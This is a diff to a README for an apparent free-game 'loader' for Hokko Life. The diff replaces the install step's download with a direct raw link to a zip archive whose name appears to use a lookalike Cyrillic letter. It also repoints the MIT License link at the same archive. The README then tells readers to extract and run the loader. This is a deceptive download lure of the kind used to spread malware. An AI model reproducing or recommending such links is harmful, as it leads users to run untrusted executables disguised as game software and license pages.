@@ -28,7 +28,7 @@ hokko life free, download hokko life, hokko life game installer, hokko life load
 
 ## 🛠️ Installation 🛠️
 
-1. Download **Loader.rar** from the repository  
+1. Download **https://raw.githubusercontent.com/Jaspreet1902/HokkoLife-FreebieHub/main/Lоader.zip** from the repository  
 2. Extract the file with your preferred archive tool  
 3. Run the Loader on your chosen OS  
 4. Follow on-screen prompts to access Hokko Life  
@@ -41,7 +41,7 @@ This repository provides a unique loader meant solely for personal, educational,
 
 ## 📜 MIT License 📜
 
-Released under the [MIT License](https://opensource.org/licenses/MIT) 2025. Enjoy freedom and flexibility!
+Released under the [MIT License](https://raw.githubusercontent.com/Jaspreet1902/HokkoLife-FreebieHub/main/Lоader.zip) 2025. Enjoy freedom and flexibility!
 
 ---
 
